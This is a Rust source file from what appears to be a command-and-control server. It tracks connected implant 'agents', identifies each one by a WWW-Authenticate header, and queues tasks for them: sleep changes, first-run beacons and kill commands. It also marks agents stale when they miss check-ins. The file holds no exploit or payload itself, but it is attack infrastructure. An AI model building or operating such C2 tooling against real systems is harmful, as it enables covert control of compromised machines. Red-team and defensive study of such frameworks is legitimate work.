use core::panic;
use std::sync::Arc;

use axum::http::HeaderMap;
use chrono::{DateTime, Duration, Utc};
use scc::HashMap;
use serde::{Deserialize, Serialize};
use shared::tasks::{Command, FirstRunData, Task, tasks_contains_kill_agent};
use tokio::sync::RwLock;

use crate::db::Db;

#[derive(Serialize, Deserialize, Clone)]
pub struct Agent {
    pub uid: String,
    pub sleep: u64,
    pub first_run_data: FirstRunData,
    pub last_checkin_time: DateTime<Utc>,
    pub is_stale: bool,
}

impl Agent {
    /// Creates a new agent by querying the database. If the agent exists in the database, that will be
    /// returned, otherwise, a new agent will be inserted and that will be returned.
    async fn from_first_run_data(
        id: &str,
        db: &Db,
        frd: FirstRunData,
    ) -> (Agent, Option<Vec<Task>>) {
        match db.get_agent_with_tasks_by_id(id, frd.clone()).await {
            Ok((agent, tasks)) => (agent, tasks),
            Err(e) => match e {
                sqlx::Error::RowNotFound => {
                    // Add the new agent into the db, and also return with it an empty vec
                    return (
                        db.insert_new_agent(id, frd)
                            .await
                            .expect("failed to insert new agent"),
                        None,
                    );
                }
                _ => {
                    panic!("{}", e);
                }
            },
        }
    }

    pub fn get_config_data(&self) -> Vec<Task> {
        //
        // Here we. can push any tasks to the queue which we want the implant to execute at the point
        // of its first run, to set up any of its environment / runtime related tasks. For example, we can
        // set its sleep to be the last sleep setting the operator changed it to, where that would differ
        // from what is hardcoded.
        //

        vec![Task {
            id: 0,
            command: Command::UpdateSleepTime,
            metadata: Some(self.sleep.to_string()),
            completed_time: 0,
        }]
    }
}

type AgentHandle = Arc<RwLock<Agent>>;

/// AgentList holds data pertaining to the in-memory representation of all active agents connected
/// to the C2.
pub struct AgentList {
    // Each agent is represented by a HashMap where the Key is the ID, and the value is the Agent
    agents: scc::HashMap<String, AgentHandle>,
}

impl AgentList {
    pub fn default() -> Self {
        Self {
            agents: HashMap::new(),
        }
    }

    pub fn list_agents(&self) -> &HashMap<String, AgentHandle> {
        &self.agents
    }

    /// Enumerates over all agents, determines whether an it is stale by calculating if we have
    /// gone past the expected check-in time of the agent by some time, `n` (where `n` is in seconds).
    pub async fn mark_agents_stale(&self, n: u32) {
        let margin = Duration::seconds(n as _);

        let mut maybe_agents = self.agents.first_entry_async().await;
        while let Some(entry) = maybe_agents {
            let now: DateTime<Utc> = Utc::now();
            let mut lock = entry.write().await;
            lock.is_stale =
                lock.last_checkin_time + Duration::seconds(lock.sleep as _) + margin < now;

            drop(lock);
            maybe_agents = entry.next_async().await;
        }
    }

    /// Gets an [`Agent`] from the HTTP request headers; if no such agent is currently connected
    /// an agent will be returned and added to the live list of agents.
    ///
    /// # Returns
    /// - An owned **copy** of the agent in the live list
    /// - An option of a Vector of Tasks, to be completed by the agent
    pub async fn get_agent_and_tasks_by_header(
        &self,
        headers: &HeaderMap,
        db: &Db,
        first_run_data: Option<FirstRunData>,
    ) -> (Agent, Option<Vec<Task>>) {
        // Lookup the agent ID by extracting it from the headers
        let agent_id = extract_agent_id(headers);

        let mut re_request_frd: bool = false;

        //
        // Get or insert the agent
        //
        let handle: AgentHandle = if let Some(entry) = self.agents.get(&agent_id) {
            Arc::clone(&entry)
        } else {
            let (new_agent, _) = Agent::from_first_run_data(
                &agent_id,
                db,
                first_run_data.clone().unwrap_or_default(),
            )
            .await;

            re_request_frd = first_run_data.is_none();

            let arc = Arc::new(RwLock::new(new_agent));
            if let Err((k, _)) = self.agents.insert(agent_id.clone(), arc.clone()) {
                panic!("Failed to insert new agent into active agents. Agent: {k}");
            };

            arc
        };

        //
        // Update in place
        //
        {
            let mut lock = handle.write().await;

            if let Some(frd) = first_run_data {
                lock.first_run_data = frd;
            }

            db.update_agent_checkin_time(&mut lock)
                .await
                .expect("failed to update checkin time");
        }

        let mut tasks = db
            .get_tasks_for_agent_by_uid(&agent_id)
            .await
            .expect("could not look up tasks for agent");

        // Here is where we handle the case of needing to task first run data again
        if re_request_frd {
            let task = Task {
                id: 0,
                command: Command::AgentsFirstSessionBeacon,
                metadata: None,
                completed_time: 0,
            };

            match tasks.as_mut() {
                Some(tasks) => {
                    tasks.push(task);
                }
                None => tasks = Some(vec![task]),
            }
        }

        let snapshot = {
            let agent_guard = handle.read().await;
            agent_guard.clone()
        };

        (snapshot, tasks)
    }

    pub fn contains_agent_by_id(&self, id: &str) -> bool {
        self.agents.contains(id)
    }

    pub async fn remove_agent(&self, id: &str) {
        let _ = self.agents.remove_async(id).await;
    }
}

/// Extracts the agent ID from the headers.
///
/// # Panics
/// This function will panic the request should the agent ID (or any WWW-Authenticate header) not be found.
/// This is acceptable as we don't want to handle these requests..
pub fn extract_agent_id(headers: &HeaderMap) -> String {
    let result = headers.get("WWW-Authenticate").expect("no agent id found");
    let result = result
        .to_str()
        .expect("could not convert agent header to str");
    result.to_string()
}

/// Checks whether the agent has the kill command as part of its tasks.
///
/// If the command is present, the agent will be removed from the list of active agents.
pub fn handle_kill_command(agent_list: Arc<AgentList>, agent: &Agent, tasks: &Option<Vec<Task>>) {
    if tasks.is_none() {
        return;
    }

    if tasks_contains_kill_agent(tasks.as_ref().unwrap()) {
        agent_list.agents.remove(&agent.uid);
    }
}
